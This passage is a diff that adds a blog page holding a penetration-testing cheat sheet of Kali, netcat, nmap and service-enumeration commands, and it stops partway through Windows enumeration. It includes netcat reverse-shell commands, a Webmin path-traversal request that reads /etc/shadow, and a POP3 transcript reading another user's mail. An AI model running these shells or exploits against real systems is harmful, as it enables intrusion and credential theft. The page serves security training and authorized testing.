@@ -1,0 +1,2511 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="KageHayashi" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      survival-guide 
+      
+      
+      |
+    
+     KageHayashi
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/t-apple-touch-icon.png">
+    <link rel="icon" href="/images/takeda_white_small.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/takeda_white_small.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">KageHayashi</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+        <li class="nav-item" data-path="/cheatsheets/">
+          <a href="/cheatsheets/">Cheat Sheets</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">survival-guide</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          1111-11-11 11:11:11
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <p><strong>WIP</strong></p>
+<p><strong>NOTE: This document refers to the target ip as the export variable $ip.</strong><br><strong>To set this value on the command line use the following syntax:</strong><br><strong>export ip&#x3D;192.168.1.100</strong></p>
+<h2 id="Kali-Linux"><a href="#Kali-Linux" class="headerlink" title="Kali Linux"></a>Kali Linux</h2><ul>
+<li><p>Set the Target IP Address to the <code>$ip</code> system variable<br><code>export ip=192.168.1.100</code></p>
+</li>
+<li><p>Find the location of a file<br><code>locate sbd.exe</code></p>
+</li>
+<li><p>Search through directories in the <code>$PATH</code> environment variable<br><code>which sbd</code></p>
+</li>
+<li><p>Find a search for a file that contains a specific string in it’s name:<br><code>find / -name sbd\*</code></p>
+</li>
+<li><p>Show active internet connections<br><code>netstat -lntp</code></p>
+</li>
+<li><p>Change Password<br><code>passwd</code></p>
+</li>
+<li><p>Verify a service is running and listening<br><code>netstat -antp |grep apache</code></p>
+</li>
+<li><p>Start a service<br><code>systemctl start ssh</code></p>
+<p><code>systemctl start apache2</code></p>
+</li>
+<li><p>Have a service start at boot<br><code>systemctl enable ssh</code></p>
+</li>
+<li><p>Stop a service<br><code>systemctl stop ssh</code></p>
+</li>
+<li><p>Unzip a gz file<br><code>gunzip access.log.gz</code></p>
+</li>
+<li><p>Unzip a tar.gz file<br><code>tar -xzvf file.tar.gz</code></p>
+</li>
+<li><p>Search command history<br><code>history | grep phrase_to_search_for</code></p>
+</li>
+<li><p>Download a webpage<br><code>wget http://www.cisco.com</code></p>
+</li>
+<li><p>Open a webpage<br><code>curl http://www.cisco.com</code></p>
+</li>
+<li><p>String manipulation</p>
+<ul>
+<li><p>Count number of lines in file<br><code>wc -l index.html</code></p>
+</li>
+<li><p>Get the start or end of a file<br><code>head index.html</code></p>
+<p><code>tail index.html</code></p>
+</li>
+<li><p>Extract all the lines that contain a string<br><code>grep &quot;href=&quot; index.html</code></p>
+</li>
+<li><p>Cut a string by a delimiter, filter results then sort<br><code>grep &quot;href=&quot; index.html | cut -d &quot;/&quot; -f 3 | grep &quot;\\.&quot; | cut -d &#39;&quot;&#39; -f 1 | sort -u</code></p>
+</li>
+<li><p>Using Grep and regular expressions and output to a file<br><code>cat index.html | grep -o &#39;http://\[^&quot;\]\*&#39; | cut -d &quot;/&quot; -f 3 | sort –u &gt; list.txt</code></p>
+</li>
+<li><p>Use a bash loop to find the IP address behind each host<br><code>for url in $(cat list.txt); do host $url; done</code></p>
+</li>
+<li><p>Collect all the IP Addresses from a log file and sort by frequency<br><code>cat access.log | cut -d &quot; &quot; -f 1 | sort | uniq -c | sort -urn</code></p>
+</li>
+</ul>
+</li>
+<li><p>Decoding using Kali</p>
+<ul>
+<li><p>Decode Base64 Encoded Values</p>
+<p><code>echo -n &quot;QWxhZGRpbjpvcGVuIHNlc2FtZQ==&quot; | base64 --decode</code></p>
+</li>
+<li><p>Decode Hexidecimal Encoded Values<br><code>echo -n &quot;46 4c 34 36 5f 33 3a 32 396472796 63637756 8656874&quot; | xxd -r -ps</code></p>
+</li>
+</ul>
+</li>
+<li><p>Netcat - Read and write TCP and UDP Packets</p>
+<ul>
+<li><p>Download Netcat for Windows (handy for creating reverse shells and transfering files on windows systems):<a target="_blank" rel="noopener" href="http://web.archive.org/web/20171113221652/https://joncraton.org/blog/46/netcat-for-windows/">https://joncraton.org/blog/46/netcat-for-windows/</a></p>
+</li>
+<li><p>Connect to a POP3 mail server<br><code>nc -nv $ip 110</code></p>
+</li>
+<li><p>Listen on TCP&#x2F;UDP port<br><code>nc -nlvp 4444</code></p>
+</li>
+<li><p>Connect to a netcat port<br><code>nc -nv $ip 4444</code></p>
+</li>
+<li><p>Send a file using netcat<br><code>nc -nv $ip 4444 &lt; /usr/share/windows-binaries/wget.exe</code></p>
+</li>
+<li><p>Receive a file using netcat<br><code>nc -nlvp 4444 &gt; incoming.exe</code></p>
+</li>
+<li><p>Some OSs (OpenBSD) will use nc.traditional rather than nc so watch out for that…</p>
+<pre><code>whereis nc
+nc: /bin/nc.traditional /usr/share/man/man1/nc.1.gz
+
+/bin/nc.traditional -e /bin/bash 1.2.3.4 4444
+</code></pre>
+</li>
+<li><p>Create a reverse shell with Ncat using cmd.exe on Windows<br><code>nc.exe -nlvp 4444 -e cmd.exe</code></p>
+<p>or</p>
+<p><code>nc.exe -nv &lt;Remote IP&gt; &lt;Remote Port&gt; -e cmd.exe</code></p>
+</li>
+<li><p>Create a reverse shell with Ncat using bash on Linux<br><code>nc -nv $ip 4444 -e /bin/bash</code></p>
+</li>
+<li><p>Netcat for Banner Grabbing:</p>
+<p><code>echo &quot;&quot; | nc -nv -w1 &lt;IP Address&gt; &lt;Ports&gt;</code></p>
+</li>
+</ul>
+</li>
+<li><p>Ncat - Netcat for Nmap project which provides more security avoid IDS</p>
+<ul>
+<li><p>Reverse shell from windows using cmd.exe using ssl<br><code>ncat --exec cmd.exe --allow $ip -vnl 4444 --ssl</code></p>
+</li>
+<li><p>Listen on port 4444 using ssl<br><code>ncat -v $ip 4444 --ssl</code></p>
+</li>
+</ul>
+</li>
+<li><p>Wireshark</p>
+<ul>
+<li><p>Show only SMTP (port 25) and ICMP traffic:</p>
+<p><code>tcp.port eq 25 or icmp</code></p>
+</li>
+<li><p>Show only traffic in the LAN (192.168.x.x), between workstations and servers – no Internet:</p>
+<p><code>ip.src==192.168.0.0/16 and ip.dst==192.168.0.0/16</code></p>
+</li>
+<li><p>Filter by a protocol ( e.g. SIP ) and filter out unwanted IPs:</p>
+<p><code>ip.src != xxx.xxx.xxx.xxx &amp;&amp; ip.dst != xxx.xxx.xxx.xxx &amp;&amp; sip</code></p>
+</li>
+<li><p>Some commands are equal</p>
+<p><code>ip.addr == xxx.xxx.xxx.xxx</code></p>
+<p>Equals</p>
+<p><code>ip.src == xxx.xxx.xxx.xxx or ip.dst == xxx.xxx.xxx.xxx</code></p>
+<p><code>ip.addr != xxx.xxx.xxx.xxx</code></p>
+<p>Equals</p>
+<p><code>ip.src != xxx.xxx.xxx.xxx or ip.dst != xxx.xxx.xxx.xxx</code></p>
+</li>
+</ul>
+</li>
+<li><p>Tcpdump</p>
+<ul>
+<li><p>Display a pcap file<br><code>tcpdump -r passwordz.pcap</code></p>
+</li>
+<li><p>Display ips and filter and sort<br><code>tcpdump -n -r passwordz.pcap | awk -F&quot; &quot; &#39;&#123;print $3&#125;&#39; | sort -u | head</code></p>
+</li>
+<li><p>Grab a packet capture on port 80<br><code>tcpdump tcp port 80 -w output.pcap -i eth0</code></p>
+</li>
+<li><p>Check for ACK or PSH flag set in a TCP packet<br><code>tcpdump -A -n &#39;tcp[13] = 24&#39; -r passwordz.pcap</code></p>
+</li>
+</ul>
+</li>
+<li><p>Dsniff</p>
+<ul>
+<li>Display a pcap file with telnet protocol<br><code>dsniff -p ch2.pcap</code></li>
+</ul>
+</li>
+<li><p>IPTables</p>
+<ul>
+<li><p>Deny traffic to ports except for Local Loopback</p>
+<p><code>iptables -A INPUT -p tcp --destination-port 13327 ! -d $ip -j DROP</code></p>
+<p><code>iptables -A INPUT -p tcp --destination-port 9991 ! -d $ip -j DROP</code></p>
+</li>
+<li><p>Clear ALL IPTables firewall rules</p>
+<pre><code><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">iptables -P INPUT ACCEPT</span><br><span class="line">iptables -P FORWARD ACCEPT</span><br><span class="line">iptables -P OUTPUT ACCEPT</span><br><span class="line">iptables -t nat -F</span><br><span class="line">iptables -t mangle -F</span><br><span class="line">iptables -F</span><br><span class="line">iptables -X</span><br><span class="line">iptables -t raw -F iptables -t raw -X</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="Information-Gathering-amp-Vulnerability-Scanning"><a href="#Information-Gathering-amp-Vulnerability-Scanning" class="headerlink" title="Information Gathering &amp; Vulnerability Scanning"></a>Information Gathering &amp; Vulnerability Scanning</h2><h3 id="Passive-Information-Gathering"><a href="#Passive-Information-Gathering" class="headerlink" title="Passive Information Gathering"></a>Passive Information Gathering</h3><ul>
+<li><p>Google Hacking</p>
+<ul>
+<li><p>Google search to find website sub domains<br><code>site:microsoft.com</code></p>
+</li>
+<li><p>Google filetype, and intitle<br><code>intitle:&quot;netbotz appliance&quot; &quot;OK&quot; -filetype:pdf</code></p>
+</li>
+<li><p>Google inurl<br><code>inurl:&quot;level/15/sexec/-/show&quot;</code></p>
+</li>
+<li><p>Google Hacking Database:<br><a target="_blank" rel="noopener" href="http://web.archive.org/web/20171113221652/https://www.exploit-db.com/google-hacking-database/">https://www.exploit-db.com/google-hacking-database/</a></p>
+</li>
+</ul>
+</li>
+<li><p>SSL Certificate Testing<br><a target="_blank" rel="noopener" href="http://web.archive.org/web/20171113221652/https://www.ssllabs.com/ssltest/analyze.html">https://www.ssllabs.com/ssltest/analyze.html</a></p>
+</li>
+<li><p>Email Harvesting</p>
+<ul>
+<li><p>Simply Email<br><code>git clone https://github.com/killswitch-GUI/SimplyEmail.git</code></p>
+<p><code>./SimplyEmail.py -all -e TARGET-DOMAIN</code></p>
+</li>
+</ul>
+</li>
+<li><p>LDAP</p>
+<ul>
+<li>LDAP null bind<br><code>ldapsearch -x -b &quot;ou=anonymous,dc=challenge01,dc=root-me,dc=org&quot; -H &quot;ldap://challenge01.root-me.org:54013&quot;</code></li>
+</ul>
+</li>
+<li><p>Netcraft</p>
+<ul>
+<li>Determine the operating system and tools used to build a site<br><a target="_blank" rel="noopener" href="http://web.archive.org/web/20171113221652/https://searchdns.netcraft.com/">https://searchdns.netcraft.com/</a></li>
+</ul>
+</li>
+<li><p>Whois Enumeration<br><code>whois domain-name-here.com</code></p>
+<p><code>whois $ip</code></p>
+</li>
+<li><p>Banner Grabbing</p>
+<ul>
+<li><p><code>nc -v $ip 25</code></p>
+</li>
+<li><p><code>telnet $ip 25</code></p>
+</li>
+<li><p><code>nc TARGET-IP 80</code></p>
+</li>
+</ul>
+</li>
+<li><p>Recon-ng - full-featured web reconnaissance framework written in Python</p>
+<ul>
+<li><p><code>cd /opt; git clone https://LaNMaSteR53@bitbucket.org/LaNMaSteR53/recon-ng.git</code></p>
+<p><code>cd /opt/recon-ng</code></p>
+<p><code>./recon-ng</code></p>
+<p><code>show modules</code></p>
+<p><code>help</code></p>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="Active-Information-Gathering"><a href="#Active-Information-Gathering" class="headerlink" title="Active Information Gathering"></a>Active Information Gathering</h3><h3 id="Port-Scanning"><a href="#Port-Scanning" class="headerlink" title="Port Scanning"></a>Port Scanning</h3><p><em>Subnet Reference Table</em></p>
+<table>
+
+<thead>
+
+<tr>
+
+<th>/</th>
+
+<th>Addresses</th>
+
+<th>Hosts</th>
+
+<th>Netmask</th>
+
+<th>Amount of a Class C</th>
+
+</tr>
+
+</thead>
+
+<tbody>
+
+<tr>
+
+<td>/30</td>
+
+<td>4</td>
+
+<td>2</td>
+
+<td>255.255.255.252</td>
+
+<td>1/64</td>
+
+</tr>
+
+<tr>
+
+<td>/29</td>
+
+<td>8</td>
+
+<td>6</td>
+
+<td>255.255.255.248</td>
+
+<td>1/32</td>
+
+</tr>
+
+<tr>
+
+<td>/28</td>
+
+<td>16</td>
+
+<td>14</td>
+
+<td>255.255.255.240</td>
+
+<td>1/16</td>
+
+</tr>
+
+<tr>
+
+<td>/27</td>
+
+<td>32</td>
+
+<td>30</td>
+
+<td>255.255.255.224</td>
+
+<td>1/8</td>
+
+</tr>
+
+<tr>
+
+<td>/26</td>
+
+<td>64</td>
+
+<td>62</td>
+
+<td>255.255.255.192</td>
+
+<td>1/4</td>
+
+</tr>
+
+<tr>
+
+<td>/25</td>
+
+<td>128</td>
+
+<td>126</td>
+
+<td>255.255.255.128</td>
+
+<td>1/2</td>
+
+</tr>
+
+<tr>
+
+<td>/24</td>
+
+<td>256</td>
+
+<td>254</td>
+
+<td>255.255.255.0</td>
+
+<td>1</td>
+
+</tr>
+
+<tr>
+
+<td>/23</td>
+
+<td>512</td>
+
+<td>510</td>
+
+<td>255.255.254.0</td>
+
+<td>2</td>
+
+</tr>
+
+<tr>
+
+<td>/22</td>
+
+<td>1024</td>
+
+<td>1022</td>
+
+<td>255.255.252.0</td>
+
+<td>4</td>
+
+</tr>
+
+<tr>
+
+<td>/21</td>
+
+<td>2048</td>
+
+<td>2046</td>
+
+<td>255.255.248.0</td>
+
+<td>8</td>
+
+</tr>
+
+<tr>
+
+<td>/20</td>
+
+<td>4096</td>
+
+<td>4094</td>
+
+<td>255.255.240.0</td>
+
+<td>16</td>
+
+</tr>
+
+<tr>
+
+<td>/19</td>
+
+<td>8192</td>
+
+<td>8190</td>
+
+<td>255.255.224.0</td>
+
+<td>32</td>
+
+</tr>
+
+<tr>
+
+<td>/18</td>
+
+<td>16384</td>
+
+<td>16382</td>
+
+<td>255.255.192.0</td>
+
+<td>64</td>
+
+</tr>
+
+<tr>
+
+<td>/17</td>
+
+<td>32768</td>
+
+<td>32766</td>
+
+<td>255.255.128.0</td>
+
+<td>128</td>
+
+</tr>
+
+<tr>
+
+<td>/16</td>
+
+<td>65536</td>
+
+<td>65534</td>
+
+<td>255.255.0.0</td>
+
+<td>256</td>
+
+</tr>
+
+</tbody>
+
+</table>
+
+<ul>
+<li><p>Set the ip address as a variable<br><code>export ip=192.168.1.100</code> <code>nmap -A -T4 -p- $ip</code></p>
+</li>
+<li><p>Netcat port Scanning<br><code>nc -nvv -w 1 -z $ip 3388-3390</code></p>
+</li>
+<li><p>Discover active IPs usign ARP on the network: <code>arp-scan $ip/24</code></p>
+</li>
+<li><p>Discover who else is on the network<br><code>netdiscover</code></p>
+</li>
+<li><p>Discover IP Mac and Mac vendors from ARP<br><code>netdiscover -r $ip/24</code></p>
+</li>
+<li><p>Nmap stealth scan using SYN<br><code>nmap -sS $ip</code></p>
+</li>
+<li><p>Nmap stealth scan using FIN<br><code>nmap -sF $ip</code></p>
+</li>
+<li><p>Nmap Banner Grabbing<br><code>nmap -sV -sT $ip</code></p>
+</li>
+<li><p>Nmap OS Fingerprinting<br><code>nmap -O $ip</code></p>
+</li>
+<li><p>Nmap Regular Scan:<br><code>nmap $ip/24</code></p>
+</li>
+<li><p>Enumeration Scan<br><code>nmap -p 1-65535 -sV -sS -A -T4 $ip/24 -oN nmap.txt</code></p>
+</li>
+<li><p>Enumeration Scan All Ports TCP &#x2F; UDP and output to a txt file<br><code>nmap -oN nmap2.txt -v -sU -sS -p- -A -T4 $ip</code></p>
+</li>
+<li><p>Nmap output to a file:<br><code>nmap -oN nmap.txt -p 1-65535 -sV -sS -A -T4 $ip/24</code></p>
+</li>
+<li><p>Quick Scan:<br><code>nmap -T4 -F $ip/24</code></p>
+</li>
+<li><p>Quick Scan Plus:<br><code>nmap -sV -T4 -O -F --version-light $ip/24</code></p>
+</li>
+<li><p>Quick traceroute<br><code>nmap -sn --traceroute $ip</code></p>
+</li>
+<li><p>All TCP and UDP Ports<br><code>nmap -v -sU -sS -p- -A -T4 $ip</code></p>
+</li>
+<li><p>Intense Scan:<br><code>nmap -T4 -A -v $ip</code></p>
+</li>
+<li><p>Intense Scan Plus UDP<br><code>nmap -sS -sU -T4 -A -v $ip/24</code></p>
+</li>
+<li><p>Intense Scan ALL TCP Ports<br><code>nmap -p 1-65535 -T4 -A -v $ip/24</code></p>
+</li>
+<li><p>Intense Scan - No Ping<br><code>nmap -T4 -A -v -Pn $ip/24</code></p>
+</li>
+<li><p>Ping scan<br><code>nmap -sn $ip/24</code></p>
+</li>
+<li><p>Slow Comprehensive Scan<br><code>nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script &quot;default or (discovery and safe)&quot; $ip/24</code></p>
+</li>
+<li><p>Scan with Active connect in order to weed out any spoofed ports designed to troll you<br><code>nmap -p1-65535 -A -T5 -sT $ip</code></p>
+</li>
+</ul>
+<h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><ul>
+<li><p>DNS Enumeration</p>
+<ul>
+<li><p>NMAP DNS Hostnames Lookup <code>nmap -F --dns-server &lt;dns server ip&gt; &lt;target ip range&gt;</code></p>
+</li>
+<li><p>Host Lookup<br><code>host -t ns megacorpone.com</code></p>
+</li>
+<li><p>Reverse Lookup Brute Force - find domains in the same range<br><code>for ip in $(seq 155 190);do host 50.7.67.$ip;done |grep -v &quot;not found&quot;</code></p>
+</li>
+<li><p>Perform DNS IP Lookup<br><code>dig a domain-name-here.com @nameserver</code></p>
+</li>
+<li><p>Perform MX Record Lookup<br><code>dig mx domain-name-here.com @nameserver</code></p>
+</li>
+<li><p>Perform Zone Transfer with DIG<br><code>dig axfr domain-name-here.com @nameserver</code></p>
+</li>
+<li><p>DNS Zone Transfers<br>Windows DNS zone transfer</p>
+<p><code>nslookup -&gt; set type=any -&gt; ls -d blah.com</code></p>
+<p>Linux DNS zone transfer</p>
+<p><code>dig axfr blah.com @ns1.blah.com</code></p>
+</li>
+<li><p>Dnsrecon DNS Brute Force<br><code>dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml</code></p>
+</li>
+<li><p>Dnsrecon DNS List of megacorp<br><code>dnsrecon -d megacorpone.com -t axfr</code></p>
+</li>
+<li><p>DNSEnum<br><code>dnsenum zonetransfer.me</code></p>
+</li>
+</ul>
+</li>
+<li><p>NMap Enumeration Script List:</p>
+<ul>
+<li><p>NMap Discovery<br><a target="_blank" rel="noopener" href="http://web.archive.org/web/20171113221652/https://nmap.org/nsedoc/categories/discovery.html"><em>https://nmap.org/nsedoc/categories/discovery.html</em></a></p>
+</li>
+<li><p>Nmap port version detection MAXIMUM power<br><code>nmap -vvv -A --reason --script=&quot;+(safe or default) and not broadcast&quot; -p &lt;port&gt; &lt;host&gt;</code></p>
+</li>
+</ul>
+</li>
+<li><p>NFS (Network File System) Enumeration</p>
+<ul>
+<li>Show Mountable NFS Shares <code>nmap -sV --script=nfs-showmount $ip</code></li>
+</ul>
+</li>
+<li><p>RPC (Remote Procedure Call) Enumeration</p>
+<ul>
+<li><p>Connect to an RPC share without a username and password and enumerate privledges<br><code>rpcclient --user=&quot;&quot; --command=enumprivs -N $ip</code></p>
+</li>
+<li><p>Connect to an RPC share with a username and enumerate privledges<br><code>rpcclient --user=&quot;&lt;Username&gt;&quot; --command=enumprivs $ip</code></p>
+</li>
+</ul>
+</li>
+<li><p>SMB Enumeration</p>
+<ul>
+<li><p>SMB OS Discovery<br><code>nmap $ip --script smb-os-discovery.nse</code></p>
+</li>
+<li><p>Nmap port scan<br><code>nmap -v -p 139,445 -oG smb.txt $ip-254</code></p>
+</li>
+<li><p>Netbios Information Scanning<br><code>nbtscan -r $ip/24</code></p>
+</li>
+<li><p>Nmap find exposed Netbios servers<br><code>nmap -sU --script nbstat.nse -p 137 $ip</code></p>
+</li>
+<li><p>Nmap all SMB scripts scan</p>
+<p><code>nmap -sV -Pn -vv -p 445 --script=&#39;(smb*) and not (brute or broadcast or dos or external or fuzzer)&#39; --script-args=unsafe=1 $ip</code></p>
+</li>
+<li><p>Nmap all SMB scripts authenticated scan</p>
+<p><code>nmap -sV -Pn -vv -p 445 --script-args smbuser=&lt;username&gt;,smbpass=&lt;password&gt; --script=&#39;(smb*) and not (brute or broadcast or dos or external or fuzzer)&#39; --script-args=unsafe=1 $ip</code></p>
+</li>
+<li><p>SMB Enumeration Tools<br><code>nmblookup -A $ip</code></p>
+<p><code>smbclient //MOUNT/share -I $ip -N</code></p>
+<p><code>rpcclient -U &quot;&quot; $ip</code></p>
+<p><code>enum4linux $ip</code></p>
+<p><code>enum4linux -a $ip</code></p>
+</li>
+<li><p>SMB Finger Printing<br><code>smbclient -L //$ip</code></p>
+</li>
+<li><p>Nmap Scan for Open SMB Shares<br><code>nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.10.0/24</code></p>
+</li>
+<li><p>Nmap scans for vulnerable SMB Servers<br><code>nmap -v -p 445 --script=smb-check-vulns --script-args=unsafe=1 $ip</code></p>
+</li>
+<li><p>Nmap List all SMB scripts installed<br><code>ls -l /usr/share/nmap/scripts/smb*</code></p>
+</li>
+<li><p>Enumerate SMB Users</p>
+<p><code>nmap -sU -sS --script=smb-enum-users -p U:137,T:139 $ip-14</code></p>
+<p>OR</p>
+<p><code>python /usr/share/doc/python-impacket-doc/examples /samrdump.py $ip</code></p>
+</li>
+<li><p>RID Cycling - Null Sessions<br><code>ridenum.py $ip 500 50000 dict.txt</code></p>
+</li>
+<li><p>Manual Null Session Testing</p>
+<p>Windows: <code>net use \\$ip\IPC$ &quot;&quot; /u:&quot;&quot;</code></p>
+<p>Linux: <code>smbclient -L //$ip</code></p>
+</li>
+</ul>
+</li>
+<li><p>SMTP Enumeration - Mail Severs</p>
+<ul>
+<li>Verify SMTP port using Netcat<br><code>nc -nv $ip 25</code></li>
+</ul>
+</li>
+<li><p>POP3 Enumeration - Reading other peoples mail - You may find usernames and passwords for email accounts, so here is how to check the mail using Telnet</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# telnet $ip 110</span><br><span class="line">+OK beta POP3 server (JAMES POP3 Server 2.3.2) ready </span><br><span class="line">USER billydean    </span><br><span class="line">+OK</span><br><span class="line">PASS password</span><br><span class="line">+OK Welcome billydean</span><br><span class="line"></span><br><span class="line">list</span><br><span class="line"></span><br><span class="line">+OK 2 1807</span><br><span class="line">1 786</span><br><span class="line">2 1021</span><br><span class="line"></span><br><span class="line">retr 1</span><br><span class="line"></span><br><span class="line">+OK Message follows</span><br><span class="line">From: jamesbrown@motown.com</span><br><span class="line">Dear Billy Dean,</span><br><span class="line"></span><br><span class="line">Here is your login for remote desktop ... try not to forget it this time!</span><br><span class="line">username: billydean</span><br><span class="line">password: PA$$W0RD!Z</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>SNMP Enumeration -Simple Network Management Protocol</p>
+<ul>
+<li><p>Fix SNMP output values so they are human readable<br><code>apt-get install snmp-mibs-downloader download-mibs</code> <code>echo &quot;&quot; &gt; /etc/snmp/snmp.conf</code></p>
+</li>
+<li><p>SNMP Enumeration Commands</p>
+<ul>
+<li><code>snmpcheck -t $ip -c public</code></li>
+<li><code>snmpwalk -c public -v1 $ip 1|</code></li>
+<li><code>grep hrSWRunName|cut -d\* \* -f</code></li>
+<li><code>snmpenum -t $ip</code></li>
+<li><code>onesixtyone -c names -i hosts</code></li>
+</ul>
+</li>
+<li><p>SNMPv3 Enumeration<br><code>nmap -sV -p 161 --script=snmp-info $ip/24</code></p>
+</li>
+<li><p>Automate the username enumeration process for SNMPv3:  </p>
+<ul>
+<li><code>apt-get install snmp snmp-mibs-downloader</code> </li>
+<li><code>wget https://raw.githubusercontent.com/raesene/TestingScripts/master/snmpv3enum.rb</code></li>
+</ul>
+</li>
+<li><p>SNMP Default Credentials<br><code>/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt</code></p>
+</li>
+</ul>
+</li>
+<li><p>MS SQL Server Enumeration</p>
+<ul>
+<li>Nmap Information Gathering<br><code>nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER $ip</code></li>
+</ul>
+</li>
+<li><p>Webmin and miniserv&#x2F;0.01 Enumeration - Port 10000</p>
+<ul>
+<li><p>Test for LFI &amp; file disclosure vulnerability by grabbing &#x2F;etc&#x2F;passwd</p>
+<ul>
+<li><code>curl http://$ip:10000//unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/passwd</code></li>
+</ul>
+</li>
+<li><p>Test to see if webmin is running as root by grabbing &#x2F;etc&#x2F;shadow</p>
+<ul>
+<li><code>curl http://$ip:10000//unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/shadow</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>Linux OS Enumeration</p>
+<ul>
+<li><p>List all SUID files<br><code>find / -perm -4000 2&gt;/dev/null</code></p>
+</li>
+<li><p>Determine the current version of Linux<br><code>cat /etc/issue</code></p>
+</li>
+<li><p>Determine more information about the environment<br><code>uname -a</code></p>
+</li>
+<li><p>List processes running<br><code>ps -xaf</code></p>
+</li>
+<li><p>List the allowed (and forbidden) commands for the invoking use<br><code>sudo -l</code></p>
+</li>
+<li><p>List iptables rules<br><code>iptables --table nat --list iptables -vL -t filter iptables -vL -t nat iptables -vL -t mangle iptables -vL -t raw iptables -vL -t security</code></p>
+</li>
+</ul>
+</li>
+<li><p>Windows OS Enumeration</p>
+<ul>
+<li><p><code>net config Workstation</code></p>
+</li>
